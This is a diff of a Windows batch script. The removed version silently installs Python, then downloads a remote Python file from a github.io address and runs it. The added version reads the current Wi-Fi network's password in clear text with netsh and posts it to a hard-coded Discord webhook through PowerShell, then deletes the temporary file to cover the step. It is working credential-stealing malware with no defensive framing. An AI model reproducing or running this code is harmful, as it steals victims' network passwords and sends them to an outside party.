@@ -1,32 +1,52 @@
 @echo off
-REM Check if Python is installed
-python --version >nul 2>&1
-if %ERRORLEVEL% NEQ 0 (
-    echo Python is not installed. Installing Python...
-    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64.exe -OutFile python-installer.exe; Start-Process python-installer.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait; Remove-Item python-installer.exe"
-    echo Python has been installed.
-) else (
-    echo Python is already installed.
+setlocal enabledelayedexpansion
+
+:: Initialize variables
+set "retry_count=0"
+set "max_retries=20"
+set "password="
+
+:retry_loop
+:: Get the name of the currently connected Wi-Fi network
+for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr /R /C:"SSID"') do (
+    set "SSID=%%i"
+    set "SSID=!SSID:~1!"
+    goto :gotSSID
 )
-setlocal
-cd /d "%userprofile%\Desktop"
-:: Download the PowerShell script
-powershell -Command "Invoke-WebRequest -Uri https://radio1233.github.io/QUCXB.github.io/app -OutFile QUXBrowser.py"
-pip install PyQt5
-pip install PyQtWebEngine
-pip install PyQt5
-pip install PyQtWebEngine
+:gotSSID
 
-@echo off
-set source="%USERPROFILE%\QUXBrowser.py"
-set destination="%USERPROFILE%\Desktop\QUXBrowser.py"
+:: Retrieve the Wi-Fi password for the connected network
+for /f "tokens=2 delims=:" %%i in ('netsh wlan show profile name^="%SSID%" key^=clear ^| findstr /R /C:"Key Content"') do (
+    set "password=%%i"
+    set "password=!password:~1!"
+    goto :gotPassword
+)
+:gotPassword
 
-if exist %source% (
-    move %source% %destination%
-    echo File moved to %destination%
-) else (
-    echo Source file does not exist.
+:: Check if the password is found
+if "%password%"=="" (
+    set /a retry_count+=1
+    if !retry_count! leq %max_retries% (
+        echo Attempt #%retry_count% to retrieve password failed. Retrying...
+        timeout /t 5 /nobreak > nul
+        goto :retry_loop
+    ) else (
+        echo Maximum retries reached. No password found.
+        set "password=No password found"
+    )
 )
 
-:: Execute the PowerShell script with the webhook URL as a parameter
-QUXBrowser.py
+:: Set the Discord webhook URL
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1250855943302807633/7bOHCgMTHz08VJkQzY9Xdmi5uBj8FwVng88qWvzX-m2yLvfHuwfS00lhPvyEO7v2Fiod"
+
+:: Create a JSON payload
+echo { "content": "Wi-Fi Password: %password%" } > payload.json
+
+:: Use PowerShell to send the payload to the Discord webhook
+powershell -Command ^
+  "Invoke-WebRequest -Uri '%WEBHOOK_URL%' -Method POST -ContentType 'application/json' -InFile 'payload.json'"
+
+echo Wi-Fi password sent to Discord.
+
+:: Clean up
+del payload.json
